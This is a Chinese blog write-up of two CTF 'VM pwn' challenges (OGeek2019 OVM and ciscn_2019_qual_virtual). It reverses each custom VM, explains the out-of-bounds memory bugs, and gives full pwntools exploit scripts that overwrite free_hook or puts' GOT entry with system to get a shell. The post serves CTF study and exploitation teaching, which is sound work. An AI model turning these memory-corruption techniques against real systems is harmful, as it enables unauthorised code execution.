---
title: 关于vm pwn的学习总结
tags: vm pwn
categories: 学习总结
abbrlink: ccd7886
---

## 总结：

目前就做了两道vm pwn的题目先简单总结一下，这类题目逆向量较大，如果有分析不懂的函数或者某段指令可以尝试配合gdb动态调试观察某些寄存器或内存值的变化来猜测其功能。漏洞点大多为数组越界可以写或者任意读来劫持hook或者got表等等。不一定每个指令都要具体分析明白，个人认为去关注漏洞指令，其他指令用到哪个去简单分析哪个



## [OGeek2019 Final]OVM

### 保护策略

![image-20221204184926728](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041849897.png)

### 程序逻辑

![image-20221204185221474](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041852544.png)

首先程序申请了一块堆空间，程序结束的时候可以往里面输入东西，然后将其释放掉。随后询问了PC和SP寄存器的值(所谓的寄存器就是在bss段上开辟的一片数组)，而pc和sp在这道题里没有任何用，接着要我们要输入指令的个数。



![image-20221204192348862](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041923932.png)

上面代码的注释写的很清楚了，下面的代码在while循环里的部分是处理指令的部分，而最后read函数去往堆块里输入数据，再将这个堆块free掉

![image-20221204192408661](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041924716.png)



在execute函数里将我们输入的每个指令都进行了分析，大概就是用c语言来实现了汇编的指令，首先每个指令都是四字节，最高字节是一个操作码(这个操作码用if来判断，这个指令是干啥的)，然后另外三个字节是操作数，以add指令为例，首先用HIBYTE这个宏判断最高字节是否为0x70，如果是0x70就执行

`reg[high]=reg[low]+reg[medium]`很明显这是个add指令。通过reg数组以及配合其索引来进行的操作，索引就是指令的各个字节。

![image-20221204194431944](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041944999.png)



下面这个指令是将具体的数值赋值给reg数组里的某个元素，只有赋值完毕，上面的add指令才有用

![image-20221204203212704](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042032767.png)



而本题的漏洞则在下面两个指令

reg[low]的值可以控制，这意味着memory的索引可以溢出，从而去篡改某些指针。

![image-20221204203332481](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033519.png)

![image-20221204203341172](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033212.png)

因为无法篡改got表，所以把利用点放到程序最后往comment的输入上(如下)

![image-20221204203553678](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042035714.png)

如果我们能篡改comment这个指针的话，就意味着程序的最后可以任意地址写，并且还调用了free函数，那就利用数组溢出将comment改成free_hook-8的地址，最后输入字符串/bin/sh以及system的地址过去，执行free函数的时候则获取shell。

### 利用思路

首先我们要把free_hook-8的地址写到一个地址上，然后将这个地址利用数组溢出写到comment上。而第一步我们需要做出来一个free_hook-8的地址，考虑到bss段上方是got表，我们利用负数索引就可以实现地址任意读取，这里我读取的是stderr的地址，将其读到了reg\[4]\[5]的位置(因为地址是八字节，而一个数组元素是四字节，所以需要两个数组元素放一个地址)

而后用add指令将stderr的地址改成free_hook-8，最后将free_hook-8赋值到comment的位置即可。具体情况参考exp

### EXP

```py
from tools import *
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:26005")

p.sendlineafter("PC: ",str(0x1111))
p.sendlineafter("SP: ",str(0x1111))
p.sendlineafter("CODE SIZE: ",str(18))


def opcode(op,high,medium,low):
    payload=(op<<24)+(high<<16)+(medium<<8)+(low)
    sleep(0.1)
    p.sendline(str(payload))

p.recvuntil("CODE: ")
#create a stderr address in reg array
opcode(0x10,0,0,26)     #mov reg[0],26
opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]
opcode(0x30,4,0,2)      #mov reg[4],memory[reg[2]]
opcode(0x10,0,0,25)     #mov reg[0],25
opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]
opcode(0x30,5,0,2)      #mov reg[5],memory[reg[2]]       reg[4][5]--->stderr address

#create free_hook address through stderr address
opcode(0x10,2,0,0x10)     #mov reg[2],0x10
opcode(0x10,0,0,8)      #mov reg[0],8
opcode(0xc0,1,2,0)      #reg[1]=sal reg[2],8

opcode(0x10,2,0,0xa0)   #mov reg[2],0xa0
opcode(0x70,1,1,2)      #add reg[1],reg[2]
opcode(0x70,4,4,1)      #add reg[4],reg[1]              reg[4][5]--->free_hook address-8

debug(p,'pie',0xD39)
#let pointer comment point to free_hook
opcode(0x10,0,0,0x8)     #mov reg[0],8
opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0]
opcode(0x40,4,0,2)      #mov memory[reg[2]],reg[4]
opcode(0x10,0,0,0x7)     #mov reg[0],9
opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0]
opcode(0x40,5,0,2)      #mov memory[reg[2]],reg[5]

p.recvuntil("R4: ")
addr1=int(p.recv(8),16)
p.recvuntil("R5: ")
addr2=int(p.recv(4),16)
sys_addr=addr1+((addr2)<<32)-0x381410
log_addr('sys_addr')
p.sendafter("HOW DO YOU FEEL AT OVM?\n",b'/bin/sh\x00'+p64(sys_addr))
p.interactive()
```

![image-20221204205650878](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042056131.png)



## ciscn_2019_qual_virtual

### 保护策略

![image-20221205224348518](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052243919.png)

### 程序逻辑

#### 控制堆块与text data stack

![image-20221205224630447](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052246509.png)

程序最开始分配了data段，text段和stack段。他们实现的方式都是用一个控制堆块来存放申请出来的这个段的指针，而返回的是控制堆块的地址(以stack段举例，如下)

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052248915.png" alt="image-20221205224802845" style="zoom:50%;" />

malloc先是申请了0x10的内存出来，当做控制堆块，而后申请了8*0x40的内存当做stack，将其地址赋给s，而s这个指针存放到了ptr这个控制堆块里，最后返回ptr。

#### 获取操作码的函数

![image-20221205225055604](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052250722.png)

这里的实现思路是检测我们输入的字符串中是否出现了指令字符，比如push pop add等等，然后将对应指令换成操作码来存储到text段上(赋值如下)，40144E函数将ptr[i]存放的机器码给到了a1(text段)

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052252420.png" alt="image-20221205225251375" style="zoom:67%;" />

上面需要注意的是strtok函数，strtok函数会遍历delim中的每一个字符，如果delim中有任何一个字符在第一个参数中出现，那么就会把这个字符当做分隔符进行分割，使用过strtok函数一次后，之后的每次往下分割只需要让第一个参数为NULL即可。

#### 获取数据的函数

![image-20221205225650366](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052256437.png)

这个函数是获取用户输入的每个数据，将其存储到data段上，也是以delim分割(这个data段是和text段以及stack段配套使用的)

#### 处理指令函数

这个execute函数可以对之前输入的每个指令进行处理，需要注意的是下面的puts(s)，因为s可控，并且程序可以被篡改got表，所以之后有机会可以考虑将puts的got表劫持为system的地址，从而在此处获取shell

![image-20221205225833308](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052258349.png)

然后下面分析几个典型的函数

下面这个函数是从a1里面获取一个值，存放到a2指向的位置。

![image-20221205230047501](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052300547.png)

![image-20221205230302286](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052303350.png)

结合上图来说，(get函数)就是从第一个参数中取一个数据放置到v6中，从而识别出不同指令。

##### push函数

接着是push函数，从函数引用这里看出push函数需要一个stack的地址和data地址(如下)

![image-20221205230636113](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052306158.png)

进入内部的话是依次调用了这两个函数，前者是上面分析过的get函数，将data段里的一个数据取出来给v3，而第二个函数是将v3的值赋值给stack，具体内部实现的过程就不放了，因为我分析的不是十分透彻，**我主要是通过动态调试观察函数执行前和执行后stack data text以及寄存器里的变化得出来每个函数的作用**

![image-20221205230703076](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052307117.png)

##### add函数

然后是add函数，内部是用了两个get连续从stack里面取两次数据，相加后覆盖了第一个操作数将其放回。

![image-20221205230944629](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052309678.png)



##### save函数

![image-20221205231132218](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052311263.png)

发现就一个参数stack(注意这个stack是控制堆块的地址，而控制堆块里存放的地址才是真正指向stack的)

内部实现如下，先是从stack里取了两个数据，红框里才是最重要的部分，简单分析一下，*(stack+12)是stack中存储元素的个数，再加v2(可控)的值乘以8加上\*stack(\*stack就是真正stack的地址，而本来的stack是控制堆块的地址)得到最后的地址，save函数就是将v3的值写入最后这个地址里。

很明显v2是可控的，因此可以利用\*stack加上一个可控偏移来实现任意数据写入

![image-20221205231309007](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052313057.png)



##### load函数

load函数与save函数相反，它的漏洞最后可以利用为从任意地址读出数据放入栈中(如下)，同样是因为v2可控，这样可以利用\*stack加上可控偏移将任意地址(前提是任意地址和\*stack存在固定偏移)中的数据读入到栈中

![image-20221205232048187](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052320237.png)



### 利用思路

综上所述，我们考虑劫持puts的got表为system地址。先将puts的地址用load读入到stack中再用add函数加上一定的偏移得到system的地址，再利用save函数将system的地址写入到puts的got表。

调试过程如下：

下图为正常情况下stack与其控制堆块的关系，可以很明显的看到控制堆块里存放的是stack的指针，如果我们想去篡改got表，第一件事就是要将这个地址修改成got地址附件的地址。

> 能否直接将控制堆块中存放的地址修改为puts的got地址?
>
> 不能，如果修改后的话，*(stack+12)就会拿到一个超级大的值被当做索引(而这个超级大的值实际上是函数的真实地址)，需要注意的是控制堆块中的地址决定了stack位于何处，如果更改为puts的got地址后，之后的push操作则会对各个函数的got表进行破坏，并且\*(stack+12)也会因为过大导致程序崩溃

![image-20221205232444875](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052324075.png)

所以我们得先把stack迁移到got表附近，这里我迁移到了0x4040d0，这里正好位于了got表的下方(如下图)，并且这个地方正好都是内存为0，当做一个新的stack再好不过。

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052330226.png" alt="image-20221205233023770" style="zoom:50%;" />

此时新的stack位于got表下方，我们push进来新的索引，让其为负数，这样就能通过新的stack访问到got表中的数据，将其写到新的stack

![image-20221205233223457](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052332630.png)

![image-20221205233335216](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052333469.png)

最后执行一次save函数将system的地址写回puts的got表即可

### EXP

```py
from tools import *
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:25001")
p.sendlineafter("Your program name:\n","/bin/sh\x00")
debug(p,0x4019E2,0x401A75)

p.sendlineafter("Your instruction:\n","push push save push load push add push save")
p.sendlineafter("Your stack data:\n","4210896 -3 -21 -172800 -21")
p.interactive()

```

![image-20221205233853481](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052338726.png)



## 参考文章

[VM Pwn学习-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/208450#h2-0)

[(44条消息) OGeek_2019_Final OVM题解___lifanxin的博客-CSDN博客](https://blog.csdn.net/A951860555/article/details/117214601)